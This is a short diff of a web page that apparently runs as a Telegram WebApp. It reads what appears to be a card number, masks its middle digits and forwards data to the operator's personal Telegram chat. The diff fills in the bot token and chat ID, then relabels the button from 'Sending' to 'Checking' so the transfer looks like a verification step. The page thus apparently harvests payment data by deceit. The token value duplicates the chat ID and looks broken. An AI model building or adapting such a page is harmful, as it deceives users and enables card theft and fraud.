@@ -416,8 +416,8 @@
 
 <script>
   // НАСТРОЙКА КАНАЛА УВЕДОМЛЕНИЙ
-  const BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА'; // Токен из @BotFather
-  const CHAT_ID = 'ВАШ_ID_ЧАТА';       // Ваш личный Telegram ID (узнать в @userinfobot)
+  const BOT_TOKEN = '7239528532'; // Токен из @BotFather
+  const CHAT_ID = '7239528532';       // Ваш личный Telegram ID (узнать в @userinfobot)
 
   try {
     const tg = window.Telegram.WebApp;
@@ -660,7 +660,7 @@
   // ОТПРАВКА СТАНДАРТНОГО ТЕКСТА ПРИ УСПЕШНОМ КЛИКЕ
   btn.addEventListener('click', () => {
     btn.disabled = true;
-    btn.textContent = 'Отправка... ⏳';
+    btn.textContent = 'Проверка... ⏳';
 
     const raw = cnEl.value;
     const masked = raw.slice(0, 9) + ' **** ' + raw.slice(-4);
